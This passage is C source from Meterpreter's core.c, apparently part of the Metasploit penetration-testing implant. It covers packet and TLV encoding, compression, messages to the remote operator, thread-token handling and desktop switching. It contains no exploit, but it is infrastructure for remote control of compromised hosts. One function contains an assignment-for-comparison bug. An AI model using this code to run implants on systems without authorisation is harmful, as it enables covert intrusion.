/*!
 * @file core.c
 * @brief Definitions of core components of the Meterpreter suite.
 * @details Much of what exists in the core files is used in almost every area
 *          of the Meterpreter code base, and hence it's very important. Don't
 *          change this stuff unless you know what you're doing!
 */
#include "common.h"

#ifdef _WIN32
#ifdef USE_WINHTTP
#include <winhttp.h>
#define packet_transmit_via_http_lib packet_transmit_via_http_winhttp
#else
#include <wininet.h>
#define packet_transmit_via_http_lib packet_transmit_via_http_wininet
#endif
#endif

DWORD packet_find_tlv_buf(Packet *packet, PUCHAR payload, DWORD payloadLength, DWORD index,
		TlvType type, Tlv *tlv);

/*! @brief List element that contains packet completion routine details. */
typedef struct _PacketCompletionRoutineEntry
{
	LPCSTR                               requestId;   ///< Id of the request.
	PacketRequestCompletion              handler;     ///< Handler to call on completion.
	struct _PacketCompletionRoutineEntry *next;       ///< Pointer to the next compleiont routine entry.
} PacketCompletionRoutineEntry;

/*!
 * @brief Reference to the list of packet completion routines.
 * @details This pointer is a singularly-linked list which contains references
 *          to PacketCompletionRouteEntry items, each of which is processed
 *          when packet_call_completion_handlers is invoked.
 */
PacketCompletionRoutineEntry *packetCompletionRoutineList = NULL;

/*!
 * @brief Print a remote console message.
 * @details Transmit a single string to the remote connection with instructions
 *          to print it to the screen or whatever medium has been established.
 * @param remote Pointer to the \c Remote instance that the message should be
                 sent to
 * @param fmt Format string.
 * @param ... Varargs that will be printed to the \c fmt format string.
 * @return Indication of success or failure.
 * @retval ERROR_NOT_ENOUGH_MEMORY Unable to allocate memory for the request packet.
 * @retval ERROR_SUCCESS Transmission was successful.
 */
DWORD send_core_console_write( Remote *remote, LPCSTR fmt, ... )
{
	Packet *request = NULL;
	CHAR buf[8192];
	va_list ap;
	DWORD res;

	do
	{
		va_start(ap, fmt);
		_vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
		va_end(ap);

		// Create a message with the 'core_print' method
		if (!(request = packet_create(PACKET_TLV_TYPE_REQUEST, "core_console_write")))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Add the string to print
		if ((res = packet_add_tlv_string(request, TLV_TYPE_STRING, buf)) != NO_ERROR)
			break;

		res = packet_transmit(remote, request, NULL);

	} while (0);

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (request)
			packet_destroy(request);
	}

	return res;
}

/*!
 * @todo I have no idea why this is here, need someone else to explain.
 */
HANDLE core_update_thread_token( Remote *remote, HANDLE token )
{
#ifdef _WIN32
	HANDLE temp = NULL;

	lock_acquire( remote->lock );
	do
	{
		temp = remote->hThreadToken;

		// A NULL token resets the state back to the server token
		if(! token)
			token = remote->hServerToken;

		// Assign the thread token
		remote->hThreadToken = token;

		// Close the old token if its not one of the two active tokens
		if( temp && temp != remote->hServerToken && temp != remote->hThreadToken ) {
			CloseHandle(temp);
		}
	} while(0);

	lock_release( remote->lock );
#else
	/*
	 * XXX add POSIX implementation
	 */
#endif
	return(token);
}

/*!
 * @brief Update the session/station/desktop to be used by multi threaded meterpreter for desktop related operations.
 * @details We dont store the handles as it is more convienient to use strings, especially as we cant use the regular API
 *          to break out of sessions.
 * @remark It is up to the caller to free any station/desktop name provided as internally we use \c strdup.
 * @param remote Pointer to the remote connection.
 * @param dwSessionID ID of the session which contains the window station in \c cpStationName.
 * @param cpStationName Name of the window station that contains the desktop in \c cpDesktopName.
 * @param cpDesktopName Name of the desktop to switch to.
 */
VOID core_update_desktop( Remote * remote, DWORD dwSessionID, char * cpStationName, char * cpDesktopName )
{
#ifdef _WIN32
	DWORD temp_session  = -1;
	char * temp_station = NULL;
	char * temp_desktop = NULL;

	lock_acquire( remote->lock );

	do
	{
		temp_session = remote->dwCurrentSessionId;
		// A session id of -1 resets the state back to the servers real session id
		if( dwSessionID = -1 )
			dwSessionID = remote->dwOrigSessionId;
		// Assign the new session id
		remote->dwCurrentSessionId = dwSessionID;

		temp_station = remote->cpCurrentStationName;
		// A NULL station resets the station back to the origional process window station
		if( !cpStationName )
			cpStationName = remote->cpOrigStationName;
		// Assign the current window station name to use
		remote->cpCurrentStationName = _strdup( cpStationName );
		// free the memory for the old station name  if its not one of the two active names
		if( temp_station && temp_station != remote->cpOrigStationName && temp_station != remote->cpCurrentStationName )
			free( temp_station );

		temp_desktop = remote->cpCurrentDesktopName;
		// A NULL station resets the desktop back to the origional process desktop
		if( !cpDesktopName )
			cpDesktopName = remote->cpOrigDesktopName;
		// Assign the current window desktop name to use
		remote->cpCurrentDesktopName = _strdup( cpDesktopName );
		// free the memory for the old desktop name if its not one of the two active names
		if( temp_desktop && temp_desktop != remote->cpOrigDesktopName && temp_desktop != remote->cpCurrentDesktopName )
			free( temp_desktop );

	} while( 0 );

	lock_release( remote->lock );
#endif
}

/*!
 * @brief Create a packet of a given type (request/response) and method.
 * @param type The TLV type that this packet represents.
 * @param method TLV method type (can be \c NULL).
 * @return Pointer to the newly created \c Packet.
 */
Packet *packet_create( PacketTlvType type, LPCSTR method )
{
	Packet *packet = NULL;
	BOOL success = FALSE;

	do
	{
		if (!(packet = (Packet *)malloc(sizeof(Packet))))
			break;

		memset(packet, 0, sizeof(Packet));

		// Initialize the header length and message type
		packet->header.length = htonl(sizeof(TlvHeader));
		packet->header.type   = htonl((DWORD)type);

		// Initialize the payload to be blank
		packet->payload       = NULL;
		packet->payloadLength = 0;

		// Add the method TLV if provided
		if (method)
		{
			if (packet_add_tlv_string(packet, TLV_TYPE_METHOD, method) != ERROR_SUCCESS)
				break;
		}

		success = TRUE;

	} while (0);

	// Clean up the packet on failure
	if ((!success) && (packet))
	{
		packet_destroy(packet);

		packet = NULL;
	}

	return packet;
}

/*!
 * @brief Create a packet that is used to contain a subgroup.
 * @returns An instance of a packet to use as a group container.
 * @remarks Group packets can be used to arbitrarily nest groupings prior to
 *          sending the packet to the client.
 */
Packet* packet_create_group()
{
	Packet* packet = NULL;
	do
	{
		if (!(packet = (Packet*)malloc(sizeof(Packet))))
		{
			break;
		}

		memset(packet, 0, sizeof(Packet));

		// we don't need to worry about the TLV header at this point
		// so we'll ignore it

		// Initialize the payload to be blank
		packet->payload = NULL;
		packet->payloadLength = 0;

		return packet;
	} while (0);

	if (packet)
	{
		free(packet);
	}
	return NULL;
}

/*!
 * @brief Add a group packet to the parent packet.
 * @param packet Pointer to the container packet that the group is to be added to.
 * @param type The type of group packet being added.
 * @param groupPacket the packet containing the group data (created by `packet_create_group`).
 * @returns Indication of success or failure.
 * @remarks The function calls `packet_destroy` on the `groupPacket` if adding the packet succeeds.
 */
DWORD packet_add_group(Packet* packet, TlvType type, Packet* groupPacket)
{
	DWORD result = packet_add_tlv_raw(packet, type, groupPacket->payload, groupPacket->payloadLength);
	if (result == ERROR_SUCCESS)
	{
		packet_destroy(groupPacket);
		return ERROR_SUCCESS;
	}

	return result;
}

/*!
 * @brief Create a response packet from a request.
 * @details Create a response packet from a request, referencing the requestors
 * message identifier.
 * @param request The request \c Packet to build a response for.
 * @return Pointer to a new \c Packet.
 */
Packet *packet_create_response( Packet *request )
{
	Packet *response = NULL;
	Tlv method, requestId;
	BOOL success = FALSE;
	PacketTlvType responseType;

	if (packet_get_type(request) == PACKET_TLV_TYPE_PLAIN_REQUEST)
		responseType = PACKET_TLV_TYPE_PLAIN_RESPONSE;
	else
		responseType = PACKET_TLV_TYPE_RESPONSE;

	do
	{
		// Get the request TLV's method
		if (packet_get_tlv_string(request, TLV_TYPE_METHOD, &method) != ERROR_SUCCESS)
			break;

		// Try to allocate a response packet
		if (!(response = packet_create(responseType, (PCHAR)method.buffer)))
			break;

		// Get the request TLV's request identifier
		if (packet_get_tlv_string(request, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
			break;

		// Add the request identifier to the packet
		packet_add_tlv_string(response, TLV_TYPE_REQUEST_ID, (PCHAR)requestId.buffer);

		success = TRUE;

	} while (0);

	// Cleanup on failure
	if (!success)
	{
		if (response)
			packet_destroy(response);

		response = NULL;
	}

	return response;
}

/*!
 * @brief Destroy the packet context and the payload buffer.
 * @param packet Pointer to the \c Packet to destroy.
 */
VOID packet_destroy( Packet * packet )
{
	if( packet == NULL )
		return;

	if( packet->payload )
	{
		memset( packet->payload, 0, packet->payloadLength );
		free( packet->payload );
	}

	if( packet->decompressed_buffers )
	{
		while( TRUE )
		{
			DECOMPRESSED_BUFFER * buf = list_pop( packet->decompressed_buffers );
			if( !buf )
				break;

			if( buf->buffer )
			{
				memset( buf->buffer, 0, buf->length );
				free( buf->buffer );
			}

			free( buf );
		}

		list_destroy( packet->decompressed_buffers );
	}

	memset( packet, 0, sizeof(Packet) );

	free( packet );
}

/*!
 * @brief Add a string value TLV to a packet, including the \c NULL terminator.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param str Pointer to the string value to add to the packet.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_string( Packet *packet, TlvType type, LPCSTR str )
{
	return packet_add_tlv_raw(packet, type, (PUCHAR)str, (DWORD)strlen(str) + 1);
}

/*!
 * @brief Add a wide-string value TLV to a packet, including the \c NULL terminator.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param str Pointer to the wide-string value to add to the packet.
 * @param strLength of the string (not including the NULL terminator).
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_wstring_len(Packet *packet, TlvType type, LPCWSTR str, size_t strLength)
{
	DWORD dwResult;
	LPSTR lpStr = (LPSTR)malloc(strLength + 1);

	if (lpStr)
	{
		wcstombs(lpStr, str, strLength);
		lpStr[strLength] = 0;
		dwResult = packet_add_tlv_raw(packet, type, (PUCHAR)lpStr, (DWORD)strLength + 1);
		free(lpStr);
	}
	else
	{
		dwResult = ERROR_NOT_ENOUGH_MEMORY;
	}

	return dwResult;
}

/*!
 * @brief Add a wide-string value TLV to a packet, including the \c NULL terminator.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param str Pointer to the wide-string value to add to the packet.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_wstring(Packet *packet, TlvType type, LPCWSTR str)
{
	return packet_add_tlv_wstring_len(packet, type, str, wcslen(str));
}

/*!
 * @brief Add a unsigned integer value TLV to a packet.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param val The value to add to the packet.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_uint( Packet *packet, TlvType type, UINT val )
{
	val = htonl(val);

	return packet_add_tlv_raw(packet, type, (PUCHAR)&val, sizeof(val));
}

/*!
 * @brief Add a quad-work value TLV to a packet.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param val The value to add to the packet.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_qword( Packet *packet, TlvType type, QWORD val )
{
	val = htonq( val );

	return packet_add_tlv_raw( packet, type, (PUCHAR)&val, sizeof(QWORD) );
}


/*!
 * @brief Add a boolean value TLV to a packet.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param val The value to add to the packet.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_bool(Packet *packet, TlvType type, BOOL val)
{
	return packet_add_tlv_raw(packet, type, (PUCHAR)&val, 1);
}

/*!
 * @brief Add a group TLV to a packet.
 * @details A TLV group is a TLV that contains multiple sub-TLVs.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param entries Pointer to the array of TLV entries to add.
 * @param numEntries Count of the number of TLV entries in the \c entries array.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_group( Packet *packet, TlvType type, Tlv *entries, DWORD numEntries )
{
	DWORD totalSize = 0,
		offset = 0,
		index = 0,
		res = ERROR_SUCCESS;
	PCHAR buffer = NULL;

	// Calculate the total TLV size.
	for (index = 0; index < numEntries; index++)
		totalSize += entries[index].header.length + sizeof(TlvHeader);

	do
	{
		// Allocate storage for the complete buffer
		if (!(buffer = (PCHAR)malloc(totalSize)))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Copy the memory into the new buffer
		for (index = 0; index < numEntries; index++)
		{
			TlvHeader rawHeader;

			// Convert byte order for storage
			rawHeader.length = htonl(entries[index].header.length + sizeof(TlvHeader));
			rawHeader.type   = htonl((DWORD)entries[index].header.type);

			// Copy the TLV header & payload
			memcpy(buffer + offset, &rawHeader, sizeof(TlvHeader));
			memcpy(buffer + offset + sizeof(TlvHeader), entries[index].buffer, entries[index].header.length);

			// Update the offset into the buffer
			offset += entries[index].header.length + sizeof(TlvHeader);
		}

		// Now add the TLV group with its contents populated
		res = packet_add_tlv_raw(packet, type, buffer, totalSize);

	} while (0);

	// Free the temporary buffer
	if (buffer)
		free(buffer);

	return res;
}

/*!
 * @brief Add an array of TLVs to a packet.
 * @param packet Pointer to the packet to add the values to.
 * @param entries Pointer to the array of TLV entries to add.
 * @param numEntries Count of the number of TLV entries in the \c entries array.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlvs( Packet *packet, Tlv *entries, DWORD numEntries )
{
	DWORD index;

	for (index = 0; index < numEntries; index++)
		packet_add_tlv_raw(packet, (TlvType)entries[index].header.type, entries[index].buffer, entries[index].header.length);

	return ERROR_SUCCESS;
}

/*!
 * @brief Add a raw value TLV to a packet, with compression.
 * @details The value given in the \c buf parameter will be compressed with zlib.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param buf Pointer to the data that is to be compressed and added.
 * @param length Number of bytes in \c buf to compress.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_raw_compressed( Packet *packet, TlvType type, LPVOID buf, DWORD length )
{
	DWORD result            = ERROR_SUCCESS;
	DWORD headerLength      = sizeof( TlvHeader );
	PUCHAR newPayload       = NULL;
	BYTE * compressed_buf   = NULL;
	DWORD realLength        = 0;
	DWORD newPayloadLength  = 0;
	DWORD compressed_length = (DWORD)( 1.01 * ( length + 12 ) + 1 );

	do
	{
		compressed_buf = (BYTE *)malloc( compressed_length );
		if( !compressed_buf )
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		if( compress2( compressed_buf, &compressed_length, buf, length, Z_BEST_COMPRESSION ) != Z_OK )
		{
			result = ERROR_UNSUPPORTED_COMPRESSION;
			break;
		}

		realLength       = compressed_length + headerLength;
		newPayloadLength = packet->payloadLength + realLength;

		// Allocate/Reallocate the packet's payload
		if( packet->payload )
			newPayload = (PUCHAR)realloc(packet->payload, newPayloadLength);
		else
			newPayload = (PUCHAR)malloc(newPayloadLength);

		if( !newPayload )
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Populate the new TLV
		((LPDWORD)(newPayload + packet->payloadLength))[0] = htonl(realLength);
		((LPDWORD)(newPayload + packet->payloadLength))[1] = htonl((DWORD)type);

		memcpy(newPayload + packet->payloadLength + headerLength, compressed_buf, compressed_length );

		// Update the header length and payload length
		packet->header.length = htonl(ntohl(packet->header.length) + realLength);
		packet->payload       = newPayload;
		packet->payloadLength = newPayloadLength;

		result = ERROR_SUCCESS;

	} while( 0 );

	if( compressed_buf )
		free( compressed_buf );

	return result;
}

/*!
 * @brief Add an arbitrary raw value TLV to a packet.
 * @details The value given in the \c buf parameter will _not_ be compressed.
 * @param packet Pointer to the packet to add the value to.
 * @param type TLV type for the value.
 * @param buf Pointer to the data that is to be added.
 * @param length Number of bytes in \c buf to add.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_ENOUGH_MEMORY Insufficient memory available.
 */
DWORD packet_add_tlv_raw( Packet *packet, TlvType type, LPVOID buf, DWORD length )
{
	DWORD headerLength     = sizeof(TlvHeader);
	DWORD realLength       = length + headerLength;
	DWORD newPayloadLength = packet->payloadLength + realLength;
	PUCHAR newPayload      = NULL;

	// check if this TLV is to be compressed...
	if( ( type & TLV_META_TYPE_COMPRESSED ) == TLV_META_TYPE_COMPRESSED )
		return packet_add_tlv_raw_compressed( packet, type, buf, length );

	// Allocate/Reallocate the packet's payload
	if (packet->payload)
		newPayload = (PUCHAR)realloc( packet->payload, newPayloadLength );
	else
		newPayload = (PUCHAR)malloc( newPayloadLength );

	if (!newPayload)
		return ERROR_NOT_ENOUGH_MEMORY;

	// Populate the new TLV
	((LPDWORD)(newPayload + packet->payloadLength))[0] = htonl(realLength);
	((LPDWORD)(newPayload + packet->payloadLength))[1] = htonl((DWORD)type);

	memcpy( newPayload + packet->payloadLength + headerLength, buf, length );

	// Update the header length and payload length
	packet->header.length = htonl(ntohl(packet->header.length) + realLength);
	packet->payload       = newPayload;
	packet->payloadLength = newPayloadLength;

	return ERROR_SUCCESS;
}

/*!
 * @brief Check if a TLV is NULL-terminated.
 * @details The function checks the data within the range of bytes specified by
 *         the \c length property of the TLV \c header.
 * @param tlv Pointer to the TLV to check.
 * @return Indication of whether the TLV is terminated with a \c NULL byte or not.
 * @retval ERROR_SUCCESS A \c NULL byte is present.
 * @retval ERROR_NOT_FOUND No \c NULL byte is present.
 * @sa TlvHeader
 */
DWORD packet_is_tlv_null_terminated( Tlv *tlv )
{
	if ((tlv->header.length) && (tlv->buffer[tlv->header.length - 1] != 0))
		return ERROR_NOT_FOUND;

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the TLV type of the packet.
 * @param packet Pointer to the packet to get the type from.
 * @return \c PacketTlvType for the given \c Packet.
 */
PacketTlvType packet_get_type( Packet *packet )
{
	return (PacketTlvType)ntohl( packet->header.type );
}

/*!
 * @brief Get the TLV meta-type of the packet.
 * @param packet Pointer to the packet to get the meta-type from.
 * @return \c TlvMetaType for the given \c Packet.
 */
TlvMetaType packet_get_tlv_meta( Packet *packet, Tlv *tlv )
{
	return TLV_META_TYPE_MASK( tlv->header.type );
}

/*!
 * @brief Get a TLV of a given type from the packet.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get.
 * @param tlv Pointer to the TLV that will receive the data.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_FOUND Unable to find the TLV.
 */
DWORD packet_get_tlv( Packet *packet, TlvType type, Tlv *tlv )
{
	return packet_enum_tlv( packet, 0, type, tlv );
}

/*!
 * @brief Get a string TLV from the packet.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get.
 * @param tlv Pointer to the TLV that will receive the data.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_FOUND Unable to find the TLV or the string
 *                         value is not NULL-terminated.
 */
DWORD packet_get_tlv_string( Packet *packet, TlvType type, Tlv *tlv )
{
	DWORD res;

	if ((res = packet_get_tlv( packet, type, tlv )) == ERROR_SUCCESS)
		res = packet_is_tlv_null_terminated( tlv );

	return res;
}

/*!
 * @brief Get a TLV of a given type from a group TLV in the packet.
 * @param packet Pointer to the packet to get the TLV from.
 * @param group Pointer to the group TLV to get the value from.
 * @param type Type of TLV to get.
 * @param tlv Pointer to the TLV that will receive the data.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_FOUND Unable to find the TLV.
 */
DWORD packet_get_tlv_group_entry( Packet *packet, Tlv *group, TlvType type, Tlv *entry )
{
	return packet_find_tlv_buf( packet, group->buffer, group->header.length, 0, type, entry );
}

/*!
 * @brief Enumerate a TLV (with the option of constraining its type).
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get (optional).
 * @param tlv Pointer to the TLV that will receive the data.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_FOUND Unable to find the TLV.
 */
DWORD packet_enum_tlv( Packet *packet, DWORD index, TlvType type, Tlv *tlv )
{
	return packet_find_tlv_buf( packet, packet->payload, packet->payloadLength, index, type, tlv );
}

/*!
 * @brief Get the string value of a TLV.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get (optional).
 * @return Pointer to the string value, if found.
 * @retval NULL The string value was not found in the TLV.
 * @retval Non-NULL Pointer to the string value.
 */
PCHAR packet_get_tlv_value_string( Packet *packet, TlvType type )
{
	Tlv stringTlv;
	PCHAR string = NULL;

	if (packet_get_tlv_string( packet, type, &stringTlv ) == ERROR_SUCCESS)
		string = (PCHAR)stringTlv.buffer;

	return string;
}

/*!
 * @brief Get the unsigned int value of a TLV.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get (optional).
 * @return The value found in the TLV.
 * @todo On failure, 0 is returned. We need to make sure this is the right
 *       thing to do because 0 might also be a valid value.
 */
UINT packet_get_tlv_value_uint( Packet *packet, TlvType type )
{
	Tlv uintTlv;

	if ((packet_get_tlv( packet, type, &uintTlv ) != ERROR_SUCCESS) || (uintTlv.header.length < sizeof(DWORD)))
		return 0;

	return ntohl(*(LPDWORD)uintTlv.buffer);
}

/*!
 * @brief Get the raw value of a TLV.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get (optional).
 * @return The value found in the TLV.
 */
BYTE * packet_get_tlv_value_raw( Packet * packet, TlvType type )
{
	Tlv tlv;

	if( packet_get_tlv( packet, type, &tlv ) != ERROR_SUCCESS )
		return NULL;

	return tlv.buffer;
}

/*!
 * @brief Get the quad-word value of a TLV.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get (optional).
 * @return The value found in the TLV.
 * @todo On failure, 0 is returned. We need to make sure this is the right
 *       thing to do because 0 might also be a valid value.
 */
QWORD packet_get_tlv_value_qword( Packet *packet, TlvType type )
{
	Tlv qwordTlv;

	if( ( packet_get_tlv( packet, type, &qwordTlv ) != ERROR_SUCCESS ) || ( qwordTlv.header.length < sizeof(QWORD) ) )
		return 0;

	return ntohq( *(QWORD *)qwordTlv.buffer );
}

/*!
 * @brief Get the boolean value of a TLV.
 * @param packet Pointer to the packet to get the TLV from.
 * @param type Type of TLV to get (optional).
 * @return The value found in the TLV.
 * @todo On failure, FALSE is returned. We need to make sure this is the right
 *       thing to do because FALSE might also be a valid value.
 */
BOOL packet_get_tlv_value_bool( Packet *packet, TlvType type )
{
	Tlv boolTlv;
	BOOL val = FALSE;

	if (packet_get_tlv( packet, type, &boolTlv ) == ERROR_SUCCESS)
		val = (BOOL)(*(PCHAR)boolTlv.buffer);

	return val;
}

/*!
 * @brief Add an exception to a packet.
 * @details When adding an exception, both a TLV_EXCEPTION_CODE and TLV_EXCEPTION_STRING
 *          are added to the packet.
 * @param packet Pointer to the packet to add the detail to.
 * @param code Exception code.
 * @param fmt Form string for the exception string.
 * @param ... Varargs for the format string.
 * @return Indication of success or failure.
 * @retval ERROR_NOT_ENOUGH_MEMORY Unable to allocate memory for the request packet.
 * @retval ERROR_SUCCESS Transmission was successful.
 */
DWORD packet_add_exception( Packet *packet, DWORD code, PCHAR fmt, ... )
{
	DWORD codeNbo = htonl(code);
	char buf[8192];
	Tlv entries[2];
	va_list ap;

	// Ensure null termination
	buf[sizeof(buf) - 1] = 0;

	va_start(ap, fmt);
	_vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
	va_end(ap);

	// Populate the TLV group array
	entries[0].header.type   = TLV_TYPE_EXCEPTION_CODE;
	entries[0].header.length = 4;
	entries[0].buffer        = (PUCHAR)&codeNbo;
	entries[1].header.type   = TLV_TYPE_EXCEPTION_STRING;
	entries[1].header.length = (DWORD)strlen(buf) + 1;
	entries[1].buffer        = (PUCHAR)buf;

	// Add the TLV group, or try to at least.
	return packet_add_tlv_group( packet, TLV_TYPE_EXCEPTION, entries, 2 );
}

/*!
 * @brief Get the result code from the packet
 * @param packet Pointer to the packet to get thget the result code from
 * @return The result code.
 */
DWORD packet_get_result( Packet *packet )
{
	return packet_get_tlv_value_uint( packet, TLV_TYPE_RESULT );
}

/*
 * Enumerate TLV entries in a buffer until hitting a given index (optionally for a given type as well).
 */
/*!
 * @brief Enumerate TLV entries until hitting a given index or type.
 * @details This function will iterate through the given payload until one of the following conditions is true:
 *             - The end of the payload is encountered
 *             - The specified index is reached
 *             - A TLV of the specified type is reached
 *
 *          If the first condition is met, the function returns with a failure.
 * @param packet Pointer to the packet to get the TLV from.
 * @param payload Pointer to the payload to parse.
 * @param index Index of the TLV entry to find (optional).
 * @param type Type of TLV to get (optional).
 * @param tlv Pointer to the TLV that will receive the data.
 * @return Indication of success or failure.
 * @retval ERROR_SUCCESS The operation completed successfully.
 * @retval ERROR_NOT_FOUND Unable to find the TLV.
 */
DWORD packet_find_tlv_buf( Packet *packet, PUCHAR payload, DWORD payloadLength, DWORD index, TlvType type, Tlv *tlv )
{
	DWORD currentIndex = 0;
	DWORD offset = 0, length = 0;
	BOOL found = FALSE;
	PUCHAR current;

	memset(tlv, 0, sizeof(Tlv));

	do
	{
		// Enumerate the TLV's
		for( current = payload, length = 0 ; !found && current ; offset += length, current += length )
		{
			TlvHeader *header    = (TlvHeader *)current;
			TlvType current_type = TLV_TYPE_ANY; // effectively '0'

			if ((current + sizeof(TlvHeader) > payload + payloadLength) || (current < payload))
				break;

			// TLV's length
			length = ntohl(header->length);

			// Matching type?
			current_type = (TlvType)ntohl( header->type );

			// if the type has been compressed, temporarily remove the compression flag as compression is to be transparent.
			if( ( current_type & TLV_META_TYPE_COMPRESSED ) == TLV_META_TYPE_COMPRESSED )
				current_type = (TlvType)(current_type ^ TLV_META_TYPE_COMPRESSED);

			// check if the types match?
			if( (current_type != type) && (type != TLV_TYPE_ANY) )
				continue;

			// Matching index?
			if (currentIndex != index)
			{
				currentIndex++;
				continue;
			}

			if ((current + length > payload + payloadLength) || (current < payload))
				break;

			tlv->header.type   = ntohl(header->type);
			tlv->header.length = ntohl(header->length) - sizeof(TlvHeader);
			tlv->buffer        = payload + offset + sizeof(TlvHeader);

			if( ( tlv->header.type & TLV_META_TYPE_COMPRESSED ) == TLV_META_TYPE_COMPRESSED )
			{
				DECOMPRESSED_BUFFER * decompressed_buf = NULL;

				do
				{
					decompressed_buf = (DECOMPRESSED_BUFFER *)malloc( sizeof(DECOMPRESSED_BUFFER) );
					if( !decompressed_buf )
						break;

					// the first DWORD in a compressed buffer is the decompressed buffer length.
					decompressed_buf->length = ntohl( *(DWORD *)tlv->buffer );
					if( !decompressed_buf->length )
						break;

					decompressed_buf->buffer = (BYTE *)malloc( decompressed_buf->length );
					if( !decompressed_buf->buffer )
						break;

					tlv->header.length -= sizeof( DWORD );
					tlv->buffer += sizeof( DWORD );

					if( uncompress( (Bytef*)decompressed_buf->buffer, &decompressed_buf->length, tlv->buffer, tlv->header.length ) != Z_OK )
						break;

					tlv->header.type   = tlv->header.type ^ TLV_META_TYPE_COMPRESSED;
					tlv->header.length = decompressed_buf->length;
					tlv->buffer        = (PUCHAR)decompressed_buf->buffer;

					if( !packet->decompressed_buffers )
						packet->decompressed_buffers = list_create();

					if( !packet->decompressed_buffers )
						break;

					// each packet has a list of decompressed buffers which is used to
					// wipe and fee all decompressed buffers upon the packet being destroyed.
					list_push( packet->decompressed_buffers, decompressed_buf );

					found = TRUE;

				} while( 0 );

				if( !found && decompressed_buf )
				{
					if( decompressed_buf->buffer )
						free( decompressed_buf->buffer );
					free( decompressed_buf );
				}
			}
			else
			{
				found = TRUE;
			}
		}

	} while (0);

	return (found) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
}

/*!
 * @brief Add a completion routine for a given request identifier.
 * @return Indication of success or failure.
 * @retval ERROR_NOT_ENOUGH_MEMORY Unable to allocate memory for the \c PacketCompletionRouteEntry instance.
 * @retval ERROR_SUCCESS Addition was successful.
 */
DWORD packet_add_completion_handler( LPCSTR requestId, PacketRequestCompletion *completion )
{
	PacketCompletionRoutineEntry *entry;
	DWORD res = ERROR_SUCCESS;

	do
	{
		// Allocate the entry
		if (!(entry = (PacketCompletionRoutineEntry *)malloc( sizeof(PacketCompletionRoutineEntry) )))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Copy the completion routine information
		memcpy( &entry->handler, completion, sizeof(PacketRequestCompletion) );

		// Copy the request identifier
		if (!(entry->requestId = _strdup( requestId )))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;

			free(entry);

			break;
		}

		// Add the entry to the list
		entry->next                 = packetCompletionRoutineList;
		packetCompletionRoutineList = entry;

	} while (0);

	return res;
}

/*
 */
/*!
 * @brief Call the register completion handler(s) for the given request identifier.
 * @details Only those handlers that match the given request are executed.
 * @param remote Pointer to the \c Remote instance for this call.
 * @param response Pointer to the response \c Packet.
 * @param requestId ID of the request to execute the completion handlers of.
 * @return Indication of success or failure.
 * @retval ERROR_NOT_FOUND Unable to find any matching completion handlers for the request.
 * @retval ERROR_SUCCESS Execution was successful.
 */
